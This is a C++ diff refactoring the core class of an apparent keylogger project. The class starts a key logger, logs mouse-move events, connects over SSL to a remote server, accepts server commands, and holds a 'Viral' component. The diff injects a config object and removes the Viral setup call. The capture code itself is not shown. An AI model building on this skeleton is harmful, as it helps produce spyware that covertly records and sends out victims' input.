@@ -20,7 +20,9 @@ namespace spi
     class CSpiderCore
     {
     public:
-        CSpiderCore() = default;
+        CSpiderCore(cfg::Config &conf) :_conf(conf),
+                                        _clientSession(_ctx, _io, conf)
+        {}
 
         ~CSpiderCore()
         {
@@ -36,10 +38,9 @@ namespace spi
             __startAcceptor();
             _log(lg::Info) << "Starting..." << std::endl;
             _keyLogger->run();
-            _clientSession->onConnect(boost::bind(&CSpiderCore::__setupLogHandleConnection,
+            _clientSession.onConnect(boost::bind(&CSpiderCore::__setupLogHandleConnection,
                                                   this, net::ErrorPlaceholder));
-            _clientSession->connect();
-            _sess->setup(&_viral);
+            _clientSession.connect();
             _io.run();
             return true;
         }
@@ -85,10 +86,9 @@ namespace spi
 
         void __setup()
         {
-            _acc.bind(cfg::portAcceptor);
+            _acc.bind(_conf.portAcceptor);
             _logHandle.setup();
             _keyLogger->setup();
-            _viral.setup(_keyLogger.get());
 
             _keyLogger->onMouseMoveEvent([this](proto::MouseMove &&event) {
                 _logHandle.appendEntry(event);
@@ -102,17 +102,19 @@ namespace spi
         }
 
     private:
+        cfg::Config _conf;
+
         net::IOManager _io;
         spi::net::SSLContext _ctx{spi::net::SSLContext::SSLv23};
 
-        std::unique_ptr<ClientSession> _clientSession{std::make_unique<ClientSession>(_ctx, _io)};
+        ClientSession _clientSession;
 
         net::TCPAcceptor _acc{_io};
         ServerCommandSession *_sess{nullptr};
 
         LogHandle _logHandle;
 
-        Viral _viral{};
+        Viral _viral;
 
         KeyLogPtr _keyLogger{Factory::createKeyLogger(_io)};
 
